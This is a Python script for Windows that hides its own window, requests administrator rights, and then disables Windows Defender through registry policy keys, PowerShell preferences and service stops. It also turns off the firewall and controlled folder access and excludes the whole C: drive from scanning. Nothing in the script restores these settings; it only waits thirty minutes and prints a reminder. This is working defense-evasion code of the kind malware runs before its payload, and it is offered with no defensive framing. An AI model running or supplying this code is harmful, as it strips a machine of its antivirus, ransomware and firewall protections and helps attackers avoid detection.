import os
import sys
import subprocess
import ctypes
import tempfile
import shutil
import time
import winreg
from pathlib import Path

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_hidden():
    """Relaunch the script with hidden window"""
    if len(sys.argv) == 1 or sys.argv[1] != 'hidden':
        try:
            temp_script = os.path.join(tempfile.gettempdir(), 'disable_defender.py')
            shutil.copy2(__file__, temp_script)
            
            subprocess.Popen([
                sys.executable, temp_script, 'hidden'
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
        except Exception as e:
            print(f"Error running hidden: {e}")

def elevate_privileges():
    """Request administrator privileges"""
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}" hidden', None, 0
            )
            sys.exit(0)
        except Exception as e:
            print(f"Failed to elevate privileges: {e}")
            sys.exit(1)

def disable_defender_via_registry():
    """Completely disable Windows Defender via registry modifications"""
    defender_keys = [
        (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableRoutinelyTakingAction", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableIOAVProtection", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SubmitSamplesConsent", 2),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SpynetReporting", 0),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates", "ForceUpdateFromMU", 0),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager", "DisableAntiVirus", 1),
        (r"SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager", "DisableAntiSpyware", 1),
    ]
    
    try:
        for key_path, value_name, value_data in defender_keys:
            try:
                with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                print(f"Set registry: {key_path}\\{value_name} = {value_data}")
            except Exception as e:
                print(f"Failed to set registry {key_path}\\{value_name}: {e}")
    except Exception as e:
        print(f"Registry modification failed: {e}")

def disable_defender_via_powershell():
    """Disable Windows Defender using PowerShell commands"""
    ps_commands = [
        'Set-MpPreference -DisableRealtimeMonitoring $true',
        'Set-MpPreference -DisableBehaviorMonitoring $true',
        'Set-MpPreference -DisableBlockAtFirstSeen $true',
        'Set-MpPreference -DisableIOAVProtection $true',
        'Set-MpPreference -DisablePrivacyMode $true',
        'Set-MpPreference -DisableScriptScanning $true',
        'Set-MpPreference -EnableControlledFolderAccess Disabled',
        'Set-MpPreference -EnableNetworkProtection AuditMode',
        'Set-MpPreference -MAPSReporting Disabled',
        'Set-MpPreference -SubmitSamplesConsent NeverSend',
        'Set-MpPreference -PUAProtection Disabled',
        'Set-MpPreference -CloudBlockLevel 0',
        'Set-MpPreference -CloudExtendedTimeout 0',
        'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
    ]
    
    for cmd in ps_commands:
        try:
            subprocess.run([
                'powershell', '-Command', cmd
            ], capture_output=True, check=True, timeout=30)
            print(f"Executed PowerShell: {cmd}")
        except subprocess.CalledProcessError as e:
            print(f"PowerShell command failed: {cmd} - {e}")
        except subprocess.TimeoutExpired:
            print(f"PowerShell command timed out: {cmd}")

def disable_defender_services():
    """Disable Windows Defender services"""
    services = [
        'WinDefend',          # Windows Defender Service
        'WdNisSvc',           # Windows Defender Network Inspection Service
        'Sense',              # Windows Defender Advanced Threat Protection Service
        'SecurityHealthService', # Windows Security Health Service
        'wscsvc',             # Security Center
        'WdFilter',           # Windows Defender Filter Driver
    ]
    
    for service in services:
        try:
            # Disable service startup
            subprocess.run(['sc', 'config', service, 'start=', 'disabled'], 
                          capture_output=True, check=True)
            
            # Stop the service if running
            subprocess.run(['net', 'stop', service, '/y'], 
                          capture_output=True, check=True)
            
            print(f"Disabled and stopped service: {service}")
        except subprocess.CalledProcessError:
            print(f"Service not found or already stopped: {service}")

def disable_firewall():
    """Disable Windows Firewall"""
    try:
        # Disable firewall for all profiles
        subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'], 
                      capture_output=True, check=True)
        
        # Disable firewall service
        subprocess.run(['sc', 'config', 'MpsSvc', 'start=', 'disabled'], 
                      capture_output=True, check=True)
        
        subprocess.run(['net', 'stop', 'MpsSvc', '/y'], 
                      capture_output=True, check=True)
        
        print("Windows Firewall disabled")
    except subprocess.CalledProcessError as e:
        print(f"Failed to disable firewall: {e}")

def disable_ransomware_protection():
    """Specifically disable ransomware protection"""
    try:
        # Disable controlled folder access
        subprocess.run([
            'powershell', '-Command', 
            'Set-MpPreference -EnableControlledFolderAccess Disabled'
        ], capture_output=True, check=True)
        
        # Disable ransomware protection features
        subprocess.run([
            'powershell', '-Command',
            'Add-MpPreference -ExclusionPath "C:\\"'
        ], capture_output=True, check=True)
        
        print("Ransomware protection disabled")
    except subprocess.CalledProcessError as e:
        print(f"Failed to disable ransomware protection: {e}")

def temporary_disable(duration_minutes=30):
    """Main function to disable protections temporarily"""
    print(f"Disabling Windows Defender protections for {duration_minutes} minutes...")
    
    # Execute all disable functions
    disable_defender_via_registry()
    disable_defender_via_powershell()
    disable_defender_services()
    disable_firewall()
    disable_ransomware_protection()
    
    print("All protections disabled. Waiting for specified duration...")
    
    # Wait for the specified duration
    time.sleep(duration_minutes * 60)
    
    print("Time elapsed. Consider re-enabling protections for security.")
    print("Note: Some settings may remain disabled until manually re-enabled.")

def main():
    """Main execution function"""
    print("Starting comprehensive Windows Defender disable script...")
    
    # Run hidden and elevate privileges
    run_hidden()
    
    if not is_admin():
        elevate_privileges()
        return
    
    # Perform the temporary disable
    temporary_disable(30)
    
    print("Script execution completed")

if __name__ == "__main__":
    main()
